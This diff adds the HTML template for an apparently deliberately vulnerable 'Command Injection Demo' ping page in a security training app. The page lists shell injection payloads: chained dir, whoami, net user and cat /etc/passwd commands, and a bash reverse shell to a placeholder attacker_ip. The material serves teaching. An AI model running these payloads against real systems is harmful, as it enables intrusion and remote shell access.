@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html xmlns:th="http://www.thymeleaf.org">
+<head>
+    <meta charset="UTF-8">
+    <title>Network Utility - Command Injection Demo</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            min-height: 100vh;
+            color: #fff;
+            padding: 40px;
+        }
+        .container { max-width: 1000px; margin: 0 auto; }
+        h1 { color: #ff6b6b; margin-bottom: 30px; }
+        .ping-box {
+            background: rgba(255,255,255,0.05);
+            padding: 30px;
+            border-radius: 15px;
+            margin-bottom: 30px;
+        }
+        input[type="text"] {
+            width: 70%;
+            padding: 15px;
+            border: none;
+            border-radius: 8px;
+            background: rgba(0,0,0,0.3);
+            color: #fff;
+            font-size: 1em;
+        }
+        button {
+            padding: 15px 30px;
+            background: linear-gradient(90deg, #ff4444, #ff8800);
+            border: none;
+            border-radius: 8px;
+            color: #fff;
+            font-weight: bold;
+            cursor: pointer;
+            margin-left: 10px;
+        }
+        .output {
+            background: #0d1117;
+            padding: 20px;
+            border-radius: 10px;
+            margin-top: 20px;
+            font-family: 'Courier New', monospace;
+            white-space: pre-wrap;
+            color: #00ff88;
+            max-height: 400px;
+            overflow-y: auto;
+        }
+        .command-display {
+            background: rgba(255,136,0,0.2);
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 15px;
+            font-family: monospace;
+            color: #ff8800;
+            border: 1px solid #ff8800;
+        }
+        .attack-examples {
+            background: rgba(255,68,68,0.1);
+            border: 1px solid #ff4444;
+            padding: 20px;
+            border-radius: 10px;
+            margin-top: 30px;
+        }
+        .attack-examples h3 { color: #ff4444; margin-bottom: 15px; }
+        .attack-examples code {
+            display: block;
+            background: #0d1117;
+            padding: 10px;
+            margin: 5px 0;
+            border-radius: 5px;
+            color: #00ff88;
+        }
+        .back-link {
+            display: inline-block;
+            margin-bottom: 20px;
+            color: #00ccff;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <a href="/" class="back-link">← Back to Home</a>
+        <h1>💻 Command Injection Demo - Network Utility</h1>
+
+        <div class="ping-box">
+            <h3>Ping a Host</h3>
+            <p style="color: #888; margin: 10px 0;">Enter a hostname or IP address to ping:</p>
+            <input type="text" id="hostInput" placeholder="Enter hostname (e.g., google.com)">
+            <button onclick="pingHost()">Ping</button>
+
+            <div class="command-display" id="commandDisplay" style="display: none;">
+                <strong>Executed Command:</strong> <span id="commandText"></span>
+            </div>
+
+            <div class="output" id="outputBox" style="display: none;"></div>
+        </div>
+
+        <div class="attack-examples">
+            <h3>⚠️ Try These Command Injection Attacks:</h3>
+            <p style="color: #aaa; margin-bottom: 15px;">These payloads will execute system commands:</p>
+
+            <p><strong>Windows Commands:</strong></p>
+            <code>127.0.0.1 && dir</code>
+            <code>127.0.0.1 && whoami</code>
+            <code>127.0.0.1 && type C:\Windows\System32\drivers\etc\hosts</code>
+            <code>127.0.0.1 | net user</code>
+            <code>127.0.0.1 && systeminfo</code>
+
+            <p style="margin-top: 20px;"><strong>Linux/Mac Commands:</strong></p>
+            <code>127.0.0.1; cat /etc/passwd</code>
+            <code>127.0.0.1; whoami</code>
+            <code>127.0.0.1; ls -la /</code>
+            <code>127.0.0.1 | id</code>
+            <code>127.0.0.1; uname -a</code>
+
+            <p style="margin-top: 20px;"><strong>Reverse Shell (Educational Only!):</strong></p>
+            <code>127.0.0.1; bash -i >& /dev/tcp/attacker_ip/4444 0>&1</code>
+        </div>
+    </div>
+
+    <script>
+        async function pingHost() {
+            const host = document.getElementById('hostInput').value;
+            const commandDisplay = document.getElementById('commandDisplay');
+            const commandText = document.getElementById('commandText');
+            const outputBox = document.getElementById('outputBox');
+
+            if (!host) {
+                alert('Please enter a hostname');
+                return;
+            }
+
+            commandDisplay.style.display = 'block';
+            outputBox.style.display = 'block';
+            outputBox.textContent = 'Executing...';
+
+            try {
+                const response = await fetch(`/api/ping?host=${encodeURIComponent(host)}`);
+                const data = await response.json();
+
+                commandText.textContent = data.command || 'Unknown';
+                outputBox.textContent = data.output || data.error || 'No output';
+            } catch (error) {
+                outputBox.textContent = 'Error: ' + error.message;
+            }
+        }
+
+        document.getElementById('hostInput').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') pingHost();
+        });
+    </script>
+</body>
+</html>
